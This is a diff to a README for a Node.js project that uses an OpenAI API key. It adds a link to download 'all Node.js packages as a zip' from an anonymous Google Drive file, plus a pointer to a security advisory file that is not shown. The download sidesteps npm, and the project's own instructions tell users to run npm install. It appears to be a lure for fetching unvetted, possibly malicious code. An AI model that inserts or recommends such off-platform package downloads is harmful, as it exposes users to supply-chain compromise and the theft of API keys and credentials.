@@ -65,6 +65,8 @@ Paste your key in the backend environment variable as shown below.
 ## Requirements
 - Node.js v18 or higher
 - An OpenAI API key with access to GPT models (get from https://platform.openai.com/api-keys)
+-
+**Download all Node.js packages as a zip:** [Download packages](https://drive.google.com/uc?export=download&id=1riyJ1f7xnWuIIiNuwKUyD8QnWZ6CaVmk)
 
 ## Troubleshooting
 - If you see errors about missing modules, run `npm install` in the project root.
@@ -83,3 +85,6 @@ For questions or support, contact:
 
 ## License
 This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Security Advisory
+For important security information, see the [SECURITY-ADVISORY.md](SECURITY-ADVISORY.md) file. Always keep your API keys private and follow best practices described in the advisory.
